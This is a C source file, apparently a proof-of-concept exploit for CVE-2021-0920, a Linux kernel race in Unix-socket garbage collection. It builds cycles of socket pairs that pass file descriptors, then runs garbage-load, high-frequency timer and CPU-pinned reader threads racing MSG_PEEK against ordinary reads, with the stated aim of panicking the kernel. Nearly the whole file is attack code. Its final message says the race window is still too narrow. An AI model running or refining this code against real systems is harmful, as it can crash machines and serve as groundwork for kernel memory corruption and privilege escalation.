#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <errno.h>
#include <pthread.h>
#include <sched.h>
#include <sys/timerfd.h>
#include <time.h>

#define NUM_SOCKETS 128
#define NUM_READER_THREADS 8
#define NUM_GARBAGE_SOCKETS 2048

int sv[NUM_SOCKETS][2];
volatile int running = 1;

void send_fd(int socket, int fd) {
    struct msghdr msg = {0};
    char buf[CMSG_SPACE(sizeof(int))];
    memset(buf, 0, sizeof(buf));
    struct iovec io = { .iov_base = (void*)"", .iov_len = 1 };
    msg.msg_iov = &io;
    msg.msg_iovlen = 1;
    msg.msg_control = buf;
    msg.msg_controllen = sizeof(buf);
    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int));
    memcpy(CMSG_DATA(cmsg), &fd, sizeof(int));
    sendmsg(socket, &msg, 0);
}

// Поток, который создаёт и закрывает множество сокетов, чтобы загрузить GC
void* garbage_thread(void* arg) {
    while (running) {
        int temp_sv[2];
        for (int i = 0; i < 64; i++) {
            if (socketpair(AF_UNIX, SOCK_STREAM, 0, temp_sv) == 0) {
                send_fd(temp_sv[0], temp_sv[0]);
                close(temp_sv[0]);
                // Оставляем temp_sv[1] открытым, чтобы создать "мусор"
            }
        }
        usleep(100);
    }
    return NULL;
}

// Поток с timerfd для создания прерываний
void* timer_thread(void* arg) {
    int tfd = timerfd_create(CLOCK_MONOTONIC, 0);
    struct itimerspec its;
    its.it_value.tv_sec = 0;
    its.it_value.tv_nsec = 1000; // 1 микросекунда
    its.it_interval.tv_sec = 0;
    its.it_interval.tv_nsec = 1000;
    timerfd_settime(tfd, 0, &its, NULL);

    while (running) {
        uint64_t exp;
        read(tfd, &exp, sizeof(exp));
    }
    close(tfd);
    return NULL;
}

// Поток-читатель, который пытается выиграть гонку
void* reader_thread(void* arg) {
    long id = (long)arg;
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(id % 4, &set);
    sched_setaffinity(0, sizeof(set), &set);

    char buf[1];
    struct iovec io = { .iov_base = buf, .iov_len = sizeof(buf) };
    struct msghdr msg = {0};
    msg.msg_iov = &io;
    msg.msg_iovlen = 1;
    char cmsg_buf[CMSG_SPACE(sizeof(int))];
    msg.msg_control = cmsg_buf;
    msg.msg_controllen = sizeof(cmsg_buf);

    while (running) {
        for (int i = 0; i < NUM_SOCKETS; i++) {
            // Быстрое чередование MSG_PEEK и обычного чтения
            recvmsg(sv[i][1], &msg, MSG_PEEK);
            recvmsg(sv[i][1], &msg, 0);
        }
    }
    return NULL;
}

int main() {
    printf("[*] CVE-2021-0920 Race PoC v2 (Extended Window)\n");

    // 1. Создаём пары сокетов и циклы
    for (int i = 0; i < NUM_SOCKETS; i++) {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv[i]) < 0) {
            perror("socketpair");
            return 1;
        }
    }
    for (int i = 0; i < NUM_SOCKETS; i++) {
        int next = (i + 1) % NUM_SOCKETS;
        send_fd(sv[i][0], sv[next][0]);
    }
    for (int i = 0; i < NUM_SOCKETS; i++) {
        close(sv[i][0]);
    }
    printf("[+] Socket cycles created.\n");

    // 2. Запускаем потоки
    pthread_t garbage_tid, timer_tid;
    pthread_create(&garbage_tid, NULL, garbage_thread, NULL);
    pthread_create(&timer_tid, NULL, timer_thread, NULL);

    pthread_t readers[NUM_READER_THREADS];
    for (long i = 0; i < NUM_READER_THREADS; i++) {
        pthread_create(&readers[i], NULL, reader_thread, (void*)i);
    }

    printf("[*] Racing... If the kernel panics, we win.\n");
    sleep(120); // Даём больше времени

    running = 0;
    printf("[-] PoC finished without panic. Window still too narrow.\n");
    return 0;
}